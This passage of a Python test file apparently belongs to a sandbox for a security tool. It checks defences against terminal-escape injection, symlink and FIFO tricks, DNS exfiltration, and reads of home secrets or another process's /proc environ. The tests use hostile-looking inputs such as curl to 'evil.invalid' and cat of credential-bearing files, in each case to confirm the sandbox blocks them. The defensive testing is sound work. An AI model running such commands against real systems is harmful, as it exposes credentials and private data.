        `sh -c argv[0] argv[1:]` which mangles the `unshare ... -- cmd`
        structure. Also a shell-injection surface for any caller that
        later lets an attacker influence the command string.
        """
        with TemporaryDirectory() as out:
            with self.assertRaises(TypeError) as ctx:
                sandbox_run(
                    "echo hello",
                    target=out, output=out,
                    shell=True,
                    capture_output=True, text=True, timeout=3,
                )
            self.assertIn("shell=True", str(ctx.exception))

    def test_cmd_display_sanitises_control_chars_in_argv(self):
        """Filename args from a target repo reach logger.info via cmd_display.

        Threat: attacker-controlled target repo contains a file named
        `evil\\x1b[31m_.c`. When RAPTOR compiles/scans that file in a
        sandbox, the filename goes into argv. Without sanitisation,
        `logger.info(f"Sandbox (...): {cmd_display}")` prints the ESC
        verbatim, letting the repo author inject ANSI escape sequences
        into operator terminal output — colour flips, title changes,
        cursor moves that forge prior log lines.
        """
        import logging, io
        handler_buf = io.StringIO()
        handler = logging.StreamHandler(handler_buf)
        handler.setLevel(logging.DEBUG)
        ctx_logger = logging.getLogger("core.sandbox.context")
        prior_level = ctx_logger.level
        ctx_logger.setLevel(logging.DEBUG)
        ctx_logger.addHandler(handler)
        try:
            with TemporaryDirectory() as out:
                evil = f"{out}/evil\x1b[31m_name.txt"
                # The command will fail (file doesn't exist) but we just
                # need the log line to be emitted.
                sandbox_run(
                    ["cat", evil],
                    target=out, output=out,
                    capture_output=True, text=True, timeout=3,
                )
            logged = handler_buf.getvalue()
            self.assertNotIn("\x1b[31m", logged,
                             "cmd_display leaked a raw ESC into logger output")
            self.assertIn("\\x1b", logged,
                          "expected ESC to be escaped as \\x1b in log output")
        finally:
            ctx_logger.removeHandler(handler)
            ctx_logger.setLevel(prior_level)

    def test_asan_bug_type_sanitises_control_chars(self):
        """ASAN `bug_type` field comes from attacker-influenced stderr —
        crafted output `ERROR: AddressSanitizer: \\x1b[31mtype` would
        otherwise inject ESC into the logger via `_interpret_result`.
        Fix is a printable-char filter; this pins it.
        """
        import logging, io, subprocess
        from core.sandbox.observe import _interpret_result

        handler_buf = io.StringIO()
        handler = logging.StreamHandler(handler_buf)
        handler.setLevel(logging.DEBUG)
        obs_logger = logging.getLogger("core.sandbox.observe")
        prior_level = obs_logger.level
        obs_logger.setLevel(logging.DEBUG)
        obs_logger.addHandler(handler)
        try:
            # Fake a CompletedProcess with ASAN-looking stderr that
            # contains an ESC in the bug type.
            fake = subprocess.CompletedProcess(
                args=["target"], returncode=1,
                stdout=b"",
                stderr=b"ERROR: AddressSanitizer: \x1b[31mheap-overflow\n",
            )
            _interpret_result(fake, "target_cmd")
            logged = handler_buf.getvalue()
            self.assertNotIn("\x1b[31m", logged,
                             "ASAN bug_type leaked raw ESC into logger")
            # Also check the evidence_items entry
            self.assertIn("\\x1b", fake.sandbox_info["evidence"],
                          "evidence field should have escaped the ESC")
        finally:
            obs_logger.removeHandler(handler)
            obs_logger.setLevel(prior_level)

    def test_proxy_rejects_control_chars_in_connect_target(self):
        """Reject CONNECT targets containing control characters.

        A sandboxed child could send `CONNECT \\x1b[31mFAKE\\x1b[0m:443`
        and have ESC sequences echoed into the proxy's log output via
        the `logger.warning(f"... DENY {host}:{port} ...")` path, enabling
        terminal-escape injection: colour changes, window-title spoofing,
        or cursor-movement to overwrite prior lines with forged "allowed"
        entries. The proxy rejects these at CONNECT-parse time.
        """
        import socket as _socket, time as _time, threading
        from core.sandbox.proxy import get_proxy, _reset_for_tests
        try:
            _reset_for_tests()
            p = get_proxy(["allowed.example.com"])
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            try:
                s.settimeout(5)
                s.connect(("127.0.0.1", p.port))
                # ESC (0x1b) embedded in the CONNECT target
                s.sendall(b"CONNECT \x1b[31mEVIL:443 HTTP/1.1\r\n\r\n")
                resp = b""
                while b"\r\n\r\n" not in resp and len(resp) < 1024:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    resp += chunk
                self.assertIn(b"400 Bad Request", resp,
                              f"control-char CONNECT should be rejected; "
                              f"got {resp!r}")
            finally:
                s.close()
        finally:
            _reset_for_tests()

    def test_fake_home_refuses_symlinked_home_dir(self):
        """fake_home must refuse to materialise over a pre-existing
        symlink at `{output}/.home`.

        Threat: a sandboxed child has write access to {output} and can
        rmdir `.home/*` (all empty by default) + rmdir `.home`, then
        plant `.home` as a symlink to any user-writable directory. On
        the NEXT sandbox() call that uses the same output, the parent's
        os.makedirs for `.config` / `.cache` / `.local/share` /
        `.local/state` would resolve through the symlink and create
        those dirs under the attacker's target — a bounded but real
        "parent-side writes outside the sandbox" escape. Fix is an
        lstat check that refuses to proceed.
        """
        from core.sandbox import run_untrusted
        with TemporaryDirectory() as out:
            victim = Path(out) / "outside_the_sandbox"
            victim.mkdir()
            os.symlink(str(victim), str(Path(out) / ".home"))

            with self.assertRaises(ValueError) as ctx:
                run_untrusted(
                    ["true"],
                    target=out, output=out,
                    capture_output=True, text=True, timeout=5,
                )
            self.assertIn("not a regular directory", str(ctx.exception))

            # And critically, no parent-side dirs were created under the
            # victim (i.e. the makedirs loop never ran).
            self.assertEqual(list(victim.iterdir()), [],
                             "victim dir should still be empty — parent "
                             "created subdirs through the symlink")

    def test_proxy_events_jsonl_resists_fifo_dos(self):
        """Parent must not block indefinitely on a child-planted FIFO.

        Threat: sandboxed child plants a FIFO (mkfifo) at
        {output}/proxy-events.jsonl. Parent's post-sandbox write without
        O_NONBLOCK blocks forever on the open(O_WRONLY|O_APPEND) call —
        DoS against any RAPTOR caller that later reuses the output dir.
        Fix: open with O_NONBLOCK + O_NOFOLLOW and fstat-verify S_ISREG
        before writing; skip persistence otherwise.

        This test pins that the sandbox call completes (does not hang).
        """
        import shutil
        if not shutil.which("curl"):
            self.skipTest("curl not installed")
        with TemporaryDirectory() as out:
            os.mkfifo(os.path.join(out, "proxy-events.jsonl"))
            # Use a short timeout on the sandbox call — if the parent
            # still blocked we'd hit the subprocess timeout, not the
            # unittest one.
            r = sandbox_run(
                ["curl", "-sI", "--max-time", "2",
                 "https://never-allowed.invalid"],
                target=out, output=out,
                use_egress_proxy=True, proxy_hosts=["allowed.example.com"],
                capture_output=True, text=True, timeout=8,
            )
            # Success criterion: we got here at all (no hang). The
            # curl rc doesn't matter; what matters is the post-sandbox
            # persistence returned instead of blocking.
            self.assertIsNotNone(r)

    def test_proxy_flood_does_not_lose_earlier_events(self):
        """Per-sandbox buffer survives a CONNECT flood.

        Regression for the old shared-deque design: an attacker child
        could make >1024 CONNECTs to allow-listed hosts AFTER an
        attack attempt to an unlisted host, pushing the denied-host
        event out of the 1024-entry ring buffer before the sandbox
        exited and flushed to file. The attack was still blocked by
        the proxy at the time, but post-mortem audit lost the record.

        Per-sandbox registration eliminates this: each sandbox's
        buffer grows independently, and other concurrent activity
        can't crowd it out. This test directly exercises the proxy's
        register/unregister API with a high event count and verifies
        every event survives.
        """
        from core.sandbox.proxy import get_proxy, _reset_for_tests
        try:
            _reset_for_tests()
            p = get_proxy(["probe.test"])
            token = p.register_sandbox(caller_label="flood-probe")
            # Fabricate 2000 events directly — we're testing the buffer
            # semantics, not the actual TCP path (that path is covered
            # by the other integration tests).
            for i in range(2000):
                p._record({
                    "t": float(i), "host": f"h{i}.test", "port": 443,
                    "result": "allowed", "reason": None,
                    "resolved_ip": "93.184.216.34",
                    "bytes_c2u": 0, "bytes_u2c": 0, "duration": 0.0,
                })
            events = p.unregister_sandbox(token)
            self.assertEqual(len(events), 2000,
                             f"lost events in flood: got {len(events)}, "
                             f"expected 2000")
            # First and last events must be present — not just the tail.
            self.assertEqual(events[0]["host"], "h0.test")
            self.assertEqual(events[-1]["host"], "h1999.test")
            # caller_label stamped on every event.
            self.assertTrue(all(e["caller"] == "flood-probe" for e in events))
        finally:
            _reset_for_tests()

    def test_proxy_concurrent_sandboxes_each_see_all_events(self):
        """Concurrent register_sandbox() registrations each receive a
        full copy of each event. No attribution mixing within a single
        sandbox's buffer beyond what its own registration window sees.
        """
        from core.sandbox.proxy import get_proxy, _reset_for_tests
        try:
            _reset_for_tests()
            p = get_proxy(["probe.test"])
            t_a = p.register_sandbox(caller_label="A")
            t_b = p.register_sandbox(caller_label="B")
            for i in range(3):
                p._record({
                    "t": float(i), "host": f"h{i}.test", "port": 443,
                    "result": "allowed", "reason": None,
                    "resolved_ip": "1.2.3.4",
                    "bytes_c2u": 0, "bytes_u2c": 0, "duration": 0.0,
                })
            events_a = p.unregister_sandbox(t_a)
            events_b = p.unregister_sandbox(t_b)
            self.assertEqual(len(events_a), 3)
            self.assertEqual(len(events_b), 3)
            self.assertTrue(all(e["caller"] == "A" for e in events_a))
            self.assertTrue(all(e["caller"] == "B" for e in events_b))
            # Different dict instances — mutating one buffer's event
            # doesn't leak into the other's.
            events_a[0]["host"] = "mutated"
            self.assertNotEqual(events_b[0]["host"], "mutated")
        finally:
            _reset_for_tests()

    def test_proxy_unregister_unknown_token_is_idempotent(self):
        """Unregistering a nonexistent token returns [] (no exception).
        Callers in finally blocks can call unregister_sandbox()
        unconditionally without guarding against partial registration.
        """
        from core.sandbox.proxy import get_proxy, _reset_for_tests
        try:
            _reset_for_tests()
            p = get_proxy(["probe.test"])
            self.assertEqual(p.unregister_sandbox(99999), [])
            # Real token, unregistered twice — second is idempotent.
            token = p.register_sandbox()
            _ = p.unregister_sandbox(token)
            self.assertEqual(p.unregister_sandbox(token), [])
        finally:
            _reset_for_tests()

    def test_proxy_events_jsonl_resists_symlink_toctou(self):
        """Parent-side proxy-events.jsonl persistence must not follow a
        child-planted symlink.

        A sandboxed child with write access to {output} could pre-plant
        {output}/proxy-events.jsonl as a symlink to any user-writable
        file — ~/.bashrc, an authorized_keys-like file, a daemon log.
        Parent's post-sandbox append would then write attacker-influenced
        JSON outside the sandbox boundary. Fixed by opening the log with
        O_NOFOLLOW.

        This test pins that the post-sandbox write fails when the target
        is a symlink, and leaves the symlink target untouched.
        """
        with TemporaryDirectory() as out:
            # Canary file outside `out` that the child is supposed to NOT
            # be able to write through the sandbox.
            canary = Path(out) / "canary_outside.txt"
            canary.write_text("CANARY-ORIGINAL\n")

            # Pre-plant the symlink inside `out` — simulating what a
            # compromised child would do during a prior run.
            symlink_path = Path(out) / "proxy-events.jsonl"
            os.symlink(str(canary), str(symlink_path))

            # Generate at least one proxy event so the persistence path
            # is exercised (denied host = one event).
            import shutil
            if not shutil.which("curl"):
                self.skipTest("curl not installed")
            sandbox_run(
                ["curl", "-sI", "--max-time", "3", "https://evil.invalid"],
                target=out, output=out,
                use_egress_proxy=True, proxy_hosts=["example.com"],
                capture_output=True, text=True, timeout=10,
            )

            # The symlink target MUST be unchanged.
            self.assertEqual(canary.read_text(), "CANARY-ORIGINAL\n",
                             "parent followed the symlink and appended to the "
                             "canary file — O_NOFOLLOW missing on the "
                             "proxy-events.jsonl write")

    def test_udp_blocked_in_proxy_mode(self):
        """Proxy mode blocks AF_INET SOCK_DGRAM via seccomp — DNS exfil closed."""
        from core.sandbox import check_seccomp_available
        if not check_seccomp_available():
            self.skipTest("libseccomp not available")
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as d:
            src = Path(d) / "udp_probe.c"
            src.write_text(
                "#include <stdio.h>\n"
                "#include <sys/socket.h>\n"
                "#include <errno.h>\n"
                "int main(void){\n"
                "  int s = socket(AF_INET, SOCK_DGRAM, 0);\n"
                "  printf(\"rc=%d errno=%d\\n\", s, errno);\n"
                "  return 0;\n"
                "}\n"
            )
            bin_path = Path(d) / "udp_probe"
            compile_result = sandbox_run(
                ["gcc", "-O0", str(src), "-o", str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=15,
            )
            if compile_result.returncode != 0:
                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")
            r = sandbox_run(
                [str(bin_path)],
                target=d, output=d,
                use_egress_proxy=True, proxy_hosts=["example.com"],
                capture_output=True, text=True, timeout=5,
            )
            # AF_INET/SOCK_DGRAM must return EPERM (errno=1) under proxy mode.
            self.assertIn("errno=1", r.stdout,
                          f"UDP socket should be blocked by seccomp in proxy "
                          f"mode; got {r.stdout!r}")


class TestE2ELandlockReadRestriction(unittest.TestCase):
    """restrict_reads=True: credential-file protection."""

    def setUp(self):
        if not check_landlock_available():
            self.skipTest("Landlock not available")

    def test_home_file_blocked(self):
        """Files under $HOME are NOT in the default read allowlist — denied.

        Two layers both close this: Landlock (read-allowlist) denies with
        EACCES (Permission denied), while mount-ns isolation leaves /home
        absent from the sandbox's rootfs entirely (ENOENT, "No such file").
        Either outcome = defense worked; accept both.
        """
        restricted_file = Path.home() / ".raptor_readrestrict_test.txt"
        restricted_file.write_text("SECRET-CREDENTIAL\n")
        try:
            with TemporaryDirectory() as out:
                r = sandbox_run(
                    ["cat", str(restricted_file)],
                    target=out, output=out,
                    restrict_reads=True,
                    capture_output=True, text=True, timeout=5,
                )
                self.assertNotEqual(r.returncode, 0,
                                    "read of $HOME file should have failed")
                self.assertNotIn("SECRET-CREDENTIAL", r.stdout,
                                 "credential leaked through restrict_reads")
                denied = ("Permission denied" in r.stderr
                          or "No such file" in r.stderr)
                self.assertTrue(denied,
                                f"expected EACCES or ENOENT, got stderr={r.stderr!r}")
        finally:
            try:
                restricted_file.unlink()
            except OSError:
                pass

    def test_system_file_allowed(self):
        """System dirs (/etc, /usr, /lib, ...) in default allowlist — readable."""
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["cat", "/etc/os-release"],
                target=out, output=out,
                restrict_reads=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(r.returncode, 0)
            self.assertIn("PRETTY_NAME", r.stdout)

    def test_gcc_compiles_with_restrict_reads(self):
        """gcc needs /usr/include + /lib — both in default allowlist."""
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as out:
            src = Path(out) / "t.c"
            src.write_text("#include <stdio.h>\nint main(void){return 0;}\n")
            bin_path = Path(out) / "t"
            r = sandbox_run(
                ["gcc", str(src), "-o", str(bin_path)],
                target=out, output=out,
                restrict_reads=True,
                capture_output=True, text=True, timeout=15,
            )
            self.assertEqual(r.returncode, 0,
                             f"gcc should still work with restrict_reads=True; "
                             f"stderr={r.stderr[:200]!r}")
            self.assertTrue(bin_path.exists())

    def test_dev_shm_blocked_under_restrict_reads(self):
        """/dev/shm must NOT be readable under restrict_reads.

        On hosts without mount-ns (Ubuntu 24.04+ with apparmor
        restricting unprivileged userns), /dev/shm is a tmpfs shared
        across all same-UID processes. Granting /dev wholesale in the
        read-allowlist would let a sandboxed attacker read secrets
        another app wrote to /dev/shm (e.g. gnome-keyring session
        tokens, pulseaudio cookies). Specific safe /dev files
        (null/zero/random/urandom/full/tty) are granted individually
        via per-file path_beneath rules instead.
        """
        restricted_shm = "/dev/shm/.raptor_e2e_shm_test"
        with open(restricted_shm, "w") as f:
            f.write("SECRET-IN-DEV-SHM\n")
        try:
            with TemporaryDirectory() as out:
                r = sandbox_run(
                    ["cat", restricted_shm],
                    target=out, output=out,
                    restrict_reads=True,
                    capture_output=True, text=True, timeout=5,
                )
                self.assertNotEqual(r.returncode, 0,
                                    "read of /dev/shm file should have failed")
                self.assertNotIn("SECRET-IN-DEV-SHM", r.stdout,
                                 "dev/shm leaked past restrict_reads")
                self.assertIn("Permission denied", r.stderr)
        finally:
            try:
                os.unlink(restricted_shm)
            except OSError:
                pass

    def test_dev_safe_files_still_readable_under_restrict_reads(self):
        """Per-file /dev rules keep the safe set readable while /dev/shm
        is denied. /dev/urandom is the critical one — libc / crypto init
        may read it on interpreter startup.
        """
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["head", "-c", "16", "/dev/urandom"],
                target=out, output=out,
                restrict_reads=True,
                capture_output=False, timeout=5,
            )
            self.assertEqual(r.returncode, 0,
                             "read of /dev/urandom should succeed")

    def test_proc_self_maps_readable_through_subprocess_fork(self):
        """/proc/self/maps must remain readable across intra-sandbox forks.

        Regression: an earlier attempt narrowed /proc to /proc/self in
        the read allowlist, which bound the Landlock rule to the preexec
        child's pid-specific inode. Subprocesses spawned inside the
        sandbox (sh → cmd, make → cc, etc.) had different pids and
        therefore different /proc/<pid>/ inodes, breaking ASAN/IFUNC
        resolvers that read their own /proc/self/maps. The current
        approach keeps /proc wholesale and blocks cross-process leaks
        via PID namespace instead; this test pins that intra-sandbox
        /proc access still works.
        """
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["sh", "-c", "head -c 64 /proc/self/maps"],
                target=out, output=out,
                restrict_reads=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(r.returncode, 0,
                             f"subprocess /proc/self/maps read failed — "
                             f"/proc allowlist likely narrowed to a pid-"
                             f"specific inode. stderr={r.stderr[:200]!r}")

    def test_proc_host_pid_environ_blocked_under_restrict_reads(self):
        """Host-PID /proc/<pid>/environ must not be readable from sandbox.

        In Landlock-only mode (no block_network, no mount-ns), the child
        shares the host PID namespace by default, so /proc/<host_pid>/
        environ of any same-UID host process is readable — including the
        parent RAPTOR process's env (ANTHROPIC_API_KEY, SSH creds, etc).

        The fix: restrict_reads=True triggers a PID-namespace unshare,
        so the kernel's ns-level /proc access check denies reads to any
        host-pid /proc/<pid>/environ even though /proc is wholesale
        allowlisted at the Landlock layer.

        Uses sandbox() with block_network=False so only the PID-ns path
        is exercised (not the net-ns fallback).
        """
        host_pid = os.getpid()
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["cat", f"/proc/{host_pid}/environ"],
                target=out, output=out,
                restrict_reads=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertNotEqual(r.returncode, 0,
                                "host /proc/<pid>/environ should have been "
                                "denied by PID-ns isolation")
            # PID-ns hides host pids: /proc/<host_pid> does not exist
            # inside the sandbox, so cat gets ENOENT rather than the
            # EACCES returned by Landlock alone. Either = defense worked.
            denied = ("Permission denied" in r.stderr
                      or "No such file" in r.stderr)
            self.assertTrue(denied,
                            f"expected EACCES or ENOENT; got stderr="
                            f"{r.stderr[:200]!r}")

    def test_fake_home_isolates_child_from_real_home(self):
        """run_untrusted defaults fake_home=True. The child's HOME
        points at an empty per-sandbox dir inside output, NOT the real
        user's home. Secrets planted in the real home are not readable
        (restrict_reads blocks them even by absolute path), and tools
        expanding `~` land inside the fake home.
        """
        import os as _os
        from core.sandbox import run_untrusted
        restricted_file = Path.home() / ".raptor_fake_home_regression.txt"
        restricted_file.write_text("REAL-HOME-SECRET\n")
        try:
            with TemporaryDirectory() as out:
                # 1. Child's HOME points at {output}/.home
                r = run_untrusted(
                    ["sh", "-c", "echo $HOME"],
                    target=out, output=out,
                    capture_output=True, text=True, timeout=5,
                )
                self.assertEqual(r.returncode, 0)
                self.assertTrue(r.stdout.strip().startswith(out),
                                f"HOME should be under {out!r}, "
                                f"got {r.stdout!r}")
                self.assertTrue(r.stdout.strip().endswith(".home"))

                # 2. Real HOME secret not readable (absolute path)
                r = run_untrusted(
                    ["cat", str(restricted_file)],
                    target=out, output=out,
                    capture_output=True, text=True, timeout=5,
                )
                self.assertNotEqual(r.returncode, 0)
                self.assertNotIn("REAL-HOME-SECRET", r.stdout)

                # 3. Fake home contains the pre-created XDG subdirs
                fake_home = Path(out) / ".home"
                self.assertTrue(fake_home.is_dir())
                self.assertTrue((fake_home / ".config").is_dir())
                self.assertTrue((fake_home / ".cache").is_dir())
        finally:
            try:
                restricted_file.unlink()
            except OSError:
                pass

    def test_fake_home_requires_output(self):
        """fake_home=True without output= is a config error — raise
        rather than silently skipping the feature."""
        from core.sandbox import sandbox
        with self.assertRaises(ValueError) as cm:
            with sandbox(fake_home=True):
                pass
        self.assertIn("output", str(cm.exception))

    def test_readable_paths_extends_allowlist(self):
        """readable_paths=[...] lets callers whitelist extras."""
        # Pick a path NOT in the default allowlist: /var/lib
        # (many tools check this for state; not normally allowed).
        import os
        if not os.path.isdir("/var/lib"):
            self.skipTest("/var/lib missing — can't test path extension")
        with TemporaryDirectory() as out:
            # Without extension — should fail
            r = sandbox_run(
                ["ls", "/var/lib"],
                target=out, output=out,
                restrict_reads=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertNotEqual(r.returncode, 0)
            # With extension — should succeed
            r = sandbox_run(
                ["ls", "/var/lib"],
                target=out, output=out,
                restrict_reads=True,
                readable_paths=["/var/lib"],
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(r.returncode, 0,
                             f"readable_paths extension failed: "
                             f"stderr={r.stderr[:200]!r}")


class TestE2EBuildToolCompatibility(unittest.TestCase):
    """Smoke-test common build tools under the sandbox's default config.

    Catches env-var or path dependencies we haven't allowlisted. Each test
    skips when the tool isn't installed — CI coverage is best-effort, but
    if the tool IS present, it must work under the sandbox.

    Tools RAPTOR actually uses (gcc, python, readelf, nm, strings, objdump,
    gdb, ROPgadget, git, semgrep) are exercised by dedicated tests elsewhere.
    The tools here are ones a target repo's build system might need.
    """

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

    def _require(self, tool):
        import shutil
        path = shutil.which(tool)
        if not path:
            self.skipTest(f"{tool} not installed")
        return path

    def test_pip_version(self):
        self._require("pip")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["pip", "--version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"pip under sandbox failed: stderr={r.stderr[:200]!r}")
            self.assertIn("pip", r.stdout)

    def test_pip_list(self):
        """pip list reads site-packages — a realistic read path."""
        self._require("pip")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["pip", "list", "--disable-pip-version-check"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"pip list under sandbox failed: stderr={r.stderr[:300]!r}")

    def test_cargo_version(self):
        self._require("cargo")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["cargo", "--version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"cargo under sandbox failed: stderr={r.stderr[:200]!r}")

    def test_rustc_compile_and_link(self):
        """Full rustc compile+link cycle — regression guard for the
        socketpair(AF_UNIX) issue.

        Rust's std::process::Command::spawn uses socketpair(AF_UNIX,
        SOCK_SEQPACKET, ...) internally for parent↔child error reporting
        during fork+exec: the child writes its exec errno through the
        pair so the parent can report "could not exec X". We used to
        block socketpair(AF_UNIX) in seccomp, which made rustc's linker
        invocation fail with EPERM. Removing that filter restores
        compatibility; this test is the regression guard.
        """
        self._require("rustc")
        with TemporaryDirectory() as out:
            src = Path(out) / "hi.rs"
            src.write_text("fn main() { println!(\"hi\"); }\n")
            bin_path = Path(out) / "hi"
            r = sandbox_run(
                ["rustc", "-o", str(bin_path), str(src)],
                block_network=True, target=out, output=out,
                capture_output=True, text=True, timeout=60,
            )
            self.assertEqual(r.returncode, 0,
                             f"rustc compile+link failed: stderr={r.stderr[:400]!r}")
            self.assertTrue(bin_path.exists())
            # Run the built binary under the sandbox to prove it executes
            r = sandbox_run(
                [str(bin_path)],
                block_network=True, target=out, output=out,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(r.returncode, 0)
            self.assertIn("hi", r.stdout)

    def test_cargo_new_and_build(self):
        """Full cargo build of a trivial no-deps crate — end-to-end Rust.

        This exercises the worst-case path: cargo spawns rustc which
        spawns cc. Both invocations need socketpair(AF_UNIX) for their
        fork+exec error-reporting channel.
        """
        self._require("cargo")
        self._require("rustc")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["cargo", "new", "--bin", "--offline", "--vcs", "none", "hello"],
                block_network=True,
                target=out, output=out,
                cwd=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"cargo new failed: stderr={r.stderr[:300]!r}")
            proj = Path(out) / "hello"
            self.assertTrue((proj / "Cargo.toml").exists())
            # Redirect CARGO_HOME into the sandbox so cargo's write to
            # its global cache dir stays within Landlock-allowed paths.
            import os as _os
            env = dict(_os.environ)
            env["CARGO_HOME"] = str(proj / ".cargo")
            r = sandbox_run(
                ["cargo", "build", "--offline"],
                block_network=True,
                target=str(proj), output=str(proj),
                cwd=str(proj), env=env,
                capture_output=True, text=True, timeout=120,
            )
            self.assertEqual(r.returncode, 0,
                             f"cargo build failed: stderr={r.stderr[:400]!r}")
            self.assertTrue((proj / "target" / "debug" / "hello").exists())

    def test_go_version(self):
        self._require("go")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["go", "version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"go under sandbox failed: stderr={r.stderr[:200]!r}")

    def test_go_env(self):
        """`go env` resolves GOPATH / GOROOT / GOCACHE — heavy path resolution.

        Even read-only commands like `go env` try to init the build cache,
        which defaults to ~/.cache/go-build and Landlock blocks. Any
        sandboxed go invocation must redirect GOCACHE / GOPATH / GOTMPDIR
        into the output dir. Documents the pattern for callers.
        """
        self._require("go")
        with TemporaryDirectory() as out:
            import os as _os
            gocache = Path(out) / ".gocache"
            gocache.mkdir(parents=True, exist_ok=True)
            gotmp = Path(out) / ".gotmp"
            gotmp.mkdir(parents=True, exist_ok=True)
            env = dict(_os.environ)
            env["GOCACHE"] = str(gocache)
            env["GOPATH"] = str(Path(out) / ".gopath")
            env["GOTMPDIR"] = str(gotmp)
            r = sandbox_run(
                ["go", "env"],
                block_network=True,
                target=out, output=out,
                env=env,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"go env failed: stderr={r.stderr[:300]!r}")
            self.assertIn("GOROOT=", r.stdout)

    def test_go_build_hello(self):
        """go build of a trivial hello-world — exercises compiler + linker."""
        self._require("go")
        with TemporaryDirectory() as out:
            src = Path(out) / "hello.go"
            src.write_text(
                "package main\nimport \"fmt\"\n"
                "func main(){ fmt.Println(\"hi\") }\n"
            )
            # Go writes its build cache to $GOCACHE (default ~/.cache/go-build).
            # Point it into the sandbox's output so Landlock allows writes.
            # Must pre-create — Go doesn't bootstrap GOTMPDIR itself.
            import os as _os
            gocache = Path(out) / ".gocache"; gocache.mkdir()
            gopath = Path(out) / ".gopath"; gopath.mkdir()
            gotmp = Path(out) / ".gotmp"; gotmp.mkdir()
            env = dict(_os.environ)
            env["GOCACHE"] = str(gocache)
            env["GOPATH"] = str(gopath)
            env["GOTMPDIR"] = str(gotmp)
            r = sandbox_run(
                ["go", "build", "-o", str(Path(out) / "hello"), str(src)],
                block_network=True,
                target=out, output=out,
                env=env,
                capture_output=True, text=True, timeout=60,
            )
            self.assertEqual(r.returncode, 0,
                             f"go build failed: stderr={r.stderr[:400]!r}")
            self.assertTrue((Path(out) / "hello").exists())

    def test_npm_version(self):
        self._require("npm")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["npm", "--version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"npm under sandbox failed: stderr={r.stderr[:200]!r}")

    def test_npm_init_and_pack(self):
        """npm init + npm pack — both offline, exercises package.json
        handling and tarball creation without touching the registry."""
        self._require("npm")
        with TemporaryDirectory() as out:
            # npm stores config and logs under ~/.npm by default. Point
            # those into the sandbox output so Landlock permits writes.
            import os as _os
            env = dict(_os.environ)
            env["npm_config_cache"] = str(Path(out) / ".npm-cache")
            env["npm_config_prefix"] = str(Path(out) / ".npm-prefix")
            env["HOME"] = out
            r = sandbox_run(
                ["npm", "init", "-y"],
                block_network=True,
                target=out, output=out,
                cwd=out, env=env,
                capture_output=True, text=True, timeout=30,
            )
            if r.returncode != 0:
                self.skipTest(f"npm init failed: stderr={r.stderr[:300]!r}")
            self.assertTrue((Path(out) / "package.json").exists())
            r = sandbox_run(
                ["npm", "pack"],
                block_network=True,
                target=out, output=out,
                cwd=out, env=env,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"npm pack failed: stderr={r.stderr[:300]!r}")
            # Tarball should exist
            tarballs = list(Path(out).glob("*.tgz"))
            self.assertTrue(tarballs, f"no .tgz produced in {out}")

    def test_mvn_version(self):
        """mvn's Java stack — exercises the JAVA_TOOL_OPTIONS strip path.
        If our launcher / env allowlist accidentally passed JAVA_TOOL_OPTIONS
        through, we'd see injected agent banners in mvn's startup output.
        """
        self._require("mvn")
        with TemporaryDirectory() as out:
            # mvn needs HOME for ~/.m2 (repo + settings.xml). Redirect
            # into the sandbox output so Landlock allows writes.
            import os as _os
            env = dict(_os.environ)
            env["HOME"] = out
            r = sandbox_run(
                ["mvn", "--version"],
                block_network=True,
                target=out, output=out,
                env=env,
                capture_output=True, text=True, timeout=60,
            )
            self.assertEqual(r.returncode, 0,
                             f"mvn under sandbox failed: stderr={r.stderr[:300]!r}")
            # Must print at least "Apache Maven" and a version
            self.assertIn("Apache Maven", r.stdout)

    def test_ninja_version(self):
        self._require("ninja")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["ninja", "--version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=10,
            )
            self.assertEqual(r.returncode, 0,
                             f"ninja under sandbox failed: stderr={r.stderr[:200]!r}")

    def test_rustc_version(self):
        """rustc — minimal Rust tool test separate from cargo."""
        self._require("rustc")
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["rustc", "--version"],
                block_network=True,
                target=out, output=out,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(r.returncode, 0,
                             f"rustc under sandbox failed: stderr={r.stderr[:200]!r}")


class TestE2EMaliciousMakefile(unittest.TestCase):
    """Simulate a malicious Makefile that tries to exfiltrate data."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

